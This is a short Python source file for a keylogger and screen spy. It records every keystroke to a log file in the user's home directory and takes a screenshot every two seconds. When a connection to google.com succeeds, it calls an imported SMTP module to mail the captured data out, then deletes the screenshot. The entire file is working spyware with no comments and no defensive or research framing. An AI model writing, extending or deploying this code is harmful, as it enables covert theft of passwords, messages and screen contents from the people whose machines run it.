from pynput.keyboard import Key, Listener
import pyautogui
import socket
import time
import os
import SMTP

count = 0
keys = []

directoire = os.path.expanduser('~') + '/'


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        write_file(keys)
        keys = []


def write_file(keys):
    global directoire
    filename = str('log.txt')
    files = directoire + filename

    with open(files, 'a') as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("Key") == -1:
                file.write(k)
            if k.find("enter") > 0:
                file.write("\n")


def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False


def main(key):
    on_press(key)


if __name__ == '__main__':
    with Listener(on_press=main, ) as listener:
        while True:
            time.sleep(2)
            screen = pyautogui.screenshot(directoire + 'screenshot.png')
            if is_connected() == True:
                SMTP.SEND_MAIL()
            if is_connected() == False:
                pass
            os.remove(directoire + 'screenshot.png')
        listener.join()
